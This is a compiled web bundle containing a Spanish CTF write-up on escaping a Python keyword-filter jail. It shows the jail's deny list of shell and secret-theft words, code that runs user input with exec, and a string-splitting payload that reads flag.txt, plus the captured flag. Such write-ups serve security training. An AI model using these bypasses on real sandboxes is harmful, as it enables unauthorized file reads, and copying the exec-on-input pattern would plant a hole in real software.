"use strict";(globalThis.webpackChunkctf_writeups=globalThis.webpackChunkctf_writeups||[]).push([[483],{830:(e,n,i)=>{i.d(n,{A:()=>r});const r=i.p+"assets/files/jail_security-fb6183d830dbadf2a73c002f14d88772.zip"},1746:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>s,default:()=>u,frontMatter:()=>t,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"ikerlan-ctf/400/python-jail-v2.0-maximum-security/python-jail-v2.0-maximum-security","title":"Python Jail v2.0 - Maximum Security (400)","description":"\xa1El guardia de la prisi\xf3n mejor\xf3 sus defensas!","source":"@site/docs/ikerlan-ctf/400/python-jail-v2.0-maximum-security/python-jail-v2.0-maximum-security.mdx","sourceDirName":"ikerlan-ctf/400/python-jail-v2.0-maximum-security","slug":"/ikerlan-ctf/400/python-jail-v2.0-maximum-security/","permalink":"/docs/ikerlan-ctf/400/python-jail-v2.0-maximum-security/","draft":false,"unlisted":false,"editUrl":"https://github.com/KingJorjai/jorjai.net/tree/main/packages/create-docusaurus/templates/shared/docs/ikerlan-ctf/400/python-jail-v2.0-maximum-security/python-jail-v2.0-maximum-security.mdx","tags":[],"version":"current","frontMatter":{"title":"Python Jail v2.0 - Maximum Security (400)"},"sidebar":"ctfWriteupsSidebar","previous":{"title":"L\xf3gica doble valor (400)","permalink":"/docs/ikerlan-ctf/400/logica-doble-valor/"},"next":{"title":"Operaci\xf3n DataStream: Infiltraci\xf3n en el Monitor de Tr\xe1fico (500)","permalink":"/docs/ikerlan-ctf/500/operacion-datastream-infiltracion-en-el-monitor-de-trafico/"}}');var a=i(4848),o=i(8453);const t={title:"Python Jail v2.0 - Maximum Security (400)"},s=void 0,c={},l=[{value:"An\xe1lisis inicial",id:"an\xe1lisis-inicial",level:2},{value:"Soluci\xf3n",id:"soluci\xf3n",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.p,{children:"\xa1El guardia de la prisi\xf3n mejor\xf3 sus defensas!"}),"\n",(0,a.jsx)(n.p,{children:"Despu\xe9s de ver c\xf3mo los prisioneros escapaban de la primera celda, el administrador implement\xf3 un sistema de seguridad mucho m\xe1s robusto. Esta vez hay m\xe1s de 60 palabras prohibidas y las restricciones son severas."}),"\n",(0,a.jsx)(n.p,{children:"Tu objetivo: Leer el contenido del archivo 'flag.txt'"}),"\n",(0,a.jsx)(n.p,{children:"Try Harder!"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.code,{children:"nc 0.cloud.chals.io 15068"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:i(830).A+"",children:"Descargar contenedor Docker"})}),"\n",(0,a.jsx)(n.h2,{id:"an\xe1lisis-inicial",children:"An\xe1lisis inicial"}),"\n",(0,a.jsx)(n.p,{children:"Al inspeccionar el contenedor Docker proporcionado, encontramos un entorno Python con m\xfaltiples restricciones. El archivo 'flag.txt' est\xe1 presente, pero las funciones comunes para leer archivos est\xe1n bloqueadas."}),"\n",(0,a.jsx)(n.p,{children:"Tenemos la siguiente estructura de archivos:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:".\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 flag.txt\n\u251c\u2500\u2500 jail.py\n\u2514\u2500\u2500 server.py\n"})}),"\n",(0,a.jsxs)(n.p,{children:["El archivo ",(0,a.jsx)(n.code,{children:"jail.py"})," contiene la l\xf3gica de la c\xe1rcel, incluyendo las restricciones impuestas. El archivo ",(0,a.jsx)(n.code,{children:"server.py"})," inicia el servidor que ejecuta el entorno restringido."]}),"\n",(0,a.jsxs)(n.p,{children:["A continuaci\xf3n, se muestra un extracto del archivo ",(0,a.jsx)(n.code,{children:"jail.py"})," con las palabras prohibidas:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",metastring:'title="jail.py" showLineNumbers=17',children:"def check_input(user_input):\n    banned = [\n    'import', 'file', 'system', 'exec', 'eval', 'flag',\n    'write', 'close', 'path', 'sys', 'subprocess',\n    '__class__', '__base__', '__bases__', '__mro__', '__dict__', \n    '__globals__', '__closure__', '__code__', '__getattribute__',\n    'setattr', 'dir', 'help', 'gc', 'id', 'del',\n    'compile', 'globals', 'locals', 'vars', '__import__',\n    'chr', 'ord', 'str', 'list', 'tuple', 'dict', 'bytes', 'join',\n    'lambda', 'assert', 'slice', 'popen', 'fork', 'kill', 'chmod', 'chown', \n    'socket', 'ctypes', 'requests', 'urllib', 'cat', 'grep', \n    'sudo', 'wget', 'etc', 'passwd', 'bin', 'root', 'user', 'secret', 'key', 'home'\n]\n\n    if len(user_input) > 200:\n        return False\n        \n    # highlight-start\n    for word in banned:\n        if word in user_input.lower():\n            print(word)\n            return False\n    # highlight-end\n    return True\n"})}),"\n",(0,a.jsx)(n.p,{children:"Y en este otro tramo del c\xf3dio vemos que si superamos correctamente la verificaci\xf3n de entrada, se ejecuta el c\xf3digo proporcionado por el usuario:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",metastring:'title="jail.py" showLineNumbers=55',children:'while command_count < max_commands:\n        try:\n            user_input = input("jail> ")\n            command_count += 1\n            \n            if user_input.lower() == \'quit\':\n                print("Goodbye!")\n                break\n                \n            if not check_input(user_input):\n                print("Forbidden word detected!")\n                continue\n            \n            try:\n                # highlight-next-line\n                exec(user_input)\n            except Exception as e:\n                print(f"Error: {e}")\n            \n        except KeyboardInterrupt:\n            print("\\nGoodbye!")\n            break\n        except EOFError:\n            break\n    \n    if command_count >= max_commands:\n        print("Command limit reached! Connection closed.")\n'})}),"\n",(0,a.jsx)(n.h2,{id:"soluci\xf3n",children:"Soluci\xf3n"}),"\n",(0,a.jsx)(n.p,{children:"Para superar las restricciones impuestas por el sistema de seguridad, podemos aprovechar la capacidad de Python para manipular objetos y sus atributos. A pesar de que muchas funciones y m\xf3dulos est\xe1n bloqueados, a\xfan podemos acceder a ciertos objetos internos de Python."}),"\n",(0,a.jsxs)(n.p,{children:["Lo primero de todo, me ha llamado la atenci\xf3n que las palabras ",(0,a.jsx)(n.code,{children:"open"})," y ",(0,a.jsx)(n.code,{children:"read"})," no est\xe1n en la lista de palabras prohibidas. Por lo tanto, podemos intentar abrir y leer el archivo ",(0,a.jsx)(n.code,{children:"flag.txt"})," directamente."]}),"\n",(0,a.jsxs)(n.p,{children:["Para evitar cualquier problema con la palabra ",(0,a.jsx)(n.code,{children:"flag"}),", podemos construir el nombre del archivo de manera din\xe1mica. Adem\xe1s usamos ",(0,a.jsx)(n.code,{children:"__builtins__"})," para acceder a la funci\xf3n ",(0,a.jsx)(n.code,{children:"open"}),", ya que no est\xe1 bloqueada."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"print(__builtins__.open('fl'+'ag.txt').read())\n"})}),"\n",(0,a.jsx)(n.p,{children:"Al ejecutar este comando en nuestra copia del entorno restringido, obtenemos la flag:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551            PYTHON JAIL v2.0            \u2551\n\u2551         Can you escape the jail?       \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nWelcome to the Python Jail v2!\nTry to read the flag from 'flag.txt'\nSome words are forbidden... can you find another way?\nType 'quit' to exit\nYou have 5 minutes!\n\n# highlight-start\njail> print(__builtins__.open('fl'+'ag.txt').read())\nikerlan{fake_flag}\n# highlight-end\n"})}),"\n",(0,a.jsxs)(n.p,{children:["Perfecto, hemos logrado escapar de la c\xe1rcel y leer el contenido del archivo ",(0,a.jsx)(n.code,{children:"flag.txt"}),". Ahora repetimos el proceso en el servidor remoto para obtener la flag real del desaf\xedo."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nc 0.cloud.chals.io 15068\n"})}),"\n",(0,a.jsx)(n.p,{children:"Introduciendo el mismo comando, obtenemos la flag definitiva:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{children:"ikerlan{th1nk_0ut_of_th3_b0x_lik3_a_b055}\n"})})]})}function u(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>t,x:()=>s});var r=i(6540);const a={},o=r.createContext(a);function t(e){const n=r.useContext(o);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:t(e.components),r.createElement(o.Provider,{value:n},e.children)}}}]);